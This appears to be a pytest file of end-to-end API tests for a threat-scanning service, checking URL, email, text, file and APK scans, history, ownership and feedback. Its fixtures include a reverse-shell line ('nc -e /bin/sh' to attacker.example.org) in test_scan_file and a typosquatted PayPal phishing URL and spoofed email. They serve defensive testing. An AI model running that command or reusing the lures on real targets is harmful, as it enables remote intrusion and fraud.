"""End-to-end API tests for every scan entry point and scan history."""

from __future__ import annotations

import json

from tests.apk_fixtures import build_apk_zip, build_manifest_xml

TYPO_URL = "https://paypa1-secure-login.com/verify"
OFFLINE = {
    "consent": {"third_party_lookup": False, "dns_lookup": False, "active_fetch": False}
}
VALID_VERDICTS = {"SAFE", "LOW_RISK", "SUSPICIOUS", "HIGH_RISK", "MALICIOUS", "UNKNOWN"}


async def test_scan_url_report_shape(client, user_headers):
    response = await client.post(
        "/api/v1/scan/url", headers=user_headers, json={"url": TYPO_URL, **OFFLINE}
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["scan_id"]
    assert body["scan_type"] == "url"
    assert body["verdict"] in VALID_VERDICTS
    assert 0.0 <= body["score"] <= 100.0
    assert isinstance(body["confidence"], (int, float))
    assert isinstance(body["reasons"], list)
    # A near-miss brand domain ("paypal" -> "paypa1") must not be declared safe.
    assert body["score"] >= 30.0, body
    assert body["disclaimer"]


async def test_scan_url_missing_target_rejected(client, user_headers):
    response = await client.post("/api/v1/scan/url", headers=user_headers, json={"url": ""})
    assert response.status_code == 422


async def test_scan_email(client, user_headers):
    raw = (
        "From: \"security\" <spoofed@test.cybershield>\r\n"
        "To: victim@test.dev\r\n"
        "Subject: Your account will be suspended\r\n"
        "Reply-To: verify@login.cypershield.ru\r\n\r\n"
        "Dear customer, click http://paypa1-secure-login.com/verify to keep "
        "your account. This offer expires today.\r\n"
    )
    response = await client.post(
        "/api/v1/scan/email",
        headers=user_headers,
        json={"raw_message": raw, "subject": "Your account will be suspended", **OFFLINE},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["scan_type"] == "email"
    assert body["verdict"] in VALID_VERDICTS
    assert body["reasons"]


async def test_scan_text_extracts_indicators(client, user_headers):
    response = await client.post(
        "/api/v1/scan/text",
        headers=user_headers,
        json={"text": "Urgent! Login now at http://signin-example.com/update"},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["verdict"] in VALID_VERDICTS
    assert body["character_count"] > 0
    assert any("signin-example" in url for url in body["extracted_urls"])


async def test_scan_file(client, user_headers):
    content = b"#!/bin/sh\nnc -e /bin/sh attacker.example.org 4444 &\n"
    response = await client.post(
        "/api/v1/scan/file",
        headers=user_headers,
        files={"file": ("script.sh", content, "text/x-shellscript")},
        data={"options": json.dumps({"skip_yara": True, "skip_antivirus": True})},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["scan_type"] == "file"
    assert body["filename"] == "script.sh"
    assert len(body["sha256"]) == 64
    assert body["size_bytes"] == len(content)


async def test_scan_apk_static_only(client, user_headers):
    apk = build_apk_zip(
        {"AndroidManifest.xml": build_manifest_xml({"package": "com.example.clean"})}
    )
    response = await client.post(
        "/api/v1/scan/apk",
        headers=user_headers,
        files={"file": ("app.apk", apk, "application/vnd.android.package-archive")},
        data={"options": json.dumps({"skip_yara": True, "skip_antivirus": True})},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["scan_type"] == "apk"
    assert body["verdict"] in VALID_VERDICTS


async def test_upload_too_large_rejected(client, user_headers, monkeypatch):
    from app.core.config import get_settings

    settings = get_settings()
    monkeypatch.setattr(settings, "max_upload_bytes", 10)
    response = await client.post(
        "/api/v1/scan/file",
        headers=user_headers,
        files={"file": ("big.bin", b"x" * 100, "application/octet-stream")},
        data={"options": "{}"},
    )
    assert response.status_code == 413


async def test_scan_requires_auth(client):
    response = await client.post("/api/v1/scan/url", json={"url": "https://example.com", **OFFLINE})
    assert response.status_code == 401


async def test_history_lists_and_filters(client, user_headers):
    await client.post("/api/v1/scan/url", headers=user_headers, json={"url": TYPO_URL, **OFFLINE})
    await client.post(
        "/api/v1/scan/text", headers=user_headers, json={"text": "just a note"}
    )

    listing = await client.get("/api/v1/scans", headers=user_headers)
    assert listing.status_code == 200
    body = listing.json()
    assert body["total"] >= 2
    assert body["page"] == 1
    assert len(body["items"]) == min(2, body["page_size"])

    url_only = await client.get(
        "/api/v1/scans?scan_type=url", headers=user_headers
    )
    assert url_only.status_code == 200
    assert all(item["scan_type"] == "url" for item in url_only.json()["items"])


async def test_history_pagination(client, user_headers):
    for i in range(3):
        await client.post(
            "/api/v1/scan/url",
            headers=user_headers,
            json={"url": f"https://example-{i}.com/a", **OFFLINE},
        )
    page = await client.get("/api/v1/scans?page=1&page_size=2", headers=user_headers)
    assert page.status_code == 200
    body = page.json()
    assert body["page_size"] == 2
    assert len(body["items"]) == 2
    assert body["pages"] >= 2


async def test_scan_detail_and_ownership(client, user_headers, make_user, token_headers):
    created = await client.post(
        "/api/v1/scan/text", headers=user_headers, json={"text": "hello detail"}
    )
    scan_id = created.json()["scan_id"]

    detail = await client.get(f"/api/v1/scans/{scan_id}", headers=user_headers)
    assert detail.status_code == 200
    assert detail.json()["scan_id"] == scan_id

    # A different regular account cannot read it.
    other = await make_user()
    other_headers = await token_headers(other["id"], other["email"])
    stolen = await client.get(f"/api/v1/scans/{scan_id}", headers=other_headers)
    assert stolen.status_code == 404


async def test_feedback_once_per_scan(client, user_headers):
    created = await client.post(
        "/api/v1/scan/text", headers=user_headers, json={"text": "feedback target"}
    )
    scan_id = created.json()["scan_id"]

    first = await client.post(
        f"/api/v1/scans/{scan_id}/feedback",
        headers=user_headers,
        json={"label": "true_positive", "comment": "looks right"},
    )
    assert first.status_code == 204

    second = await client.post(
        f"/api/v1/scans/{scan_id}/feedback",
        headers=user_headers,
        json={"label": "true_positive"},
    )
    assert second.status_code == 409


async def test_signals_search(client, user_headers):
    await client.post("/api/v1/scan/url", headers=user_headers, json={"url": TYPO_URL, **OFFLINE})
    search = await client.get(
        "/api/v1/signals/search?q=typosquat", headers=user_headers
    )
    assert search.status_code == 200
    hits = search.json()["items"]
    assert any("typosquat" in hit["title"].lower() or hit["code"] for hit in hits)


async def test_dashboard_aggregates(client, user_headers):
    await client.post("/api/v1/scan/url", headers=user_headers, json={"url": TYPO_URL, **OFFLINE})
    response = await client.get("/api/v1/dashboard", headers=user_headers)
    assert response.status_code == 200
    body = response.json()
    assert body["total_scans"] >= 1
    assert body["generated_at"]
    assert isinstance(body["timeline"], list)